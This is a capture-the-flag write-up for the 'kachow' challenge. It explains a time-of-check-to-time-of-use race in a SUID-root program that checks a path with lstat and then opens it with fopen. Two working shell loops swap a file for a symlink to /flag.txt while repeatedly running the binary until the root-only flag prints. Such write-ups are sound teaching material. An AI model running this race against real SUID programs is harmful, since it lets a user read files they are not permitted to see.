# kachow

| Author     | **Round** | **Player 1** | **Player 2** | **Winner** |
| ---------- | --------- | ------------ | ------------ | ---------- |
| toasterpwn | Finals    |              |              |            |

<details>
  <summary>(SPOILER) Writeup</summary>

`catv2` is a SUID-root program that refuses to open `flag.txt` or a symbolic
link. It first checks the supplied path with `lstat`, then later opens that same
path with `fopen`.

The path can be swapped between those two operations. Repeatedly replace a
regular file with a symbolic link to `/flag.txt`:

```sh
while true; do
    printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n' > ok
    ln -sf /flag.txt ok
    rm -f ok
done
```

At the same time, repeatedly invoke the vulnerable program:

```sh
while ! /home/ctf/catv2 ok 2>/dev/null | grep 'bsides{'; do :; done
```

Eventually `lstat` observes the regular file and `fopen` follows the symbolic
link, allowing the SUID process to print the root-only flag.

</details>
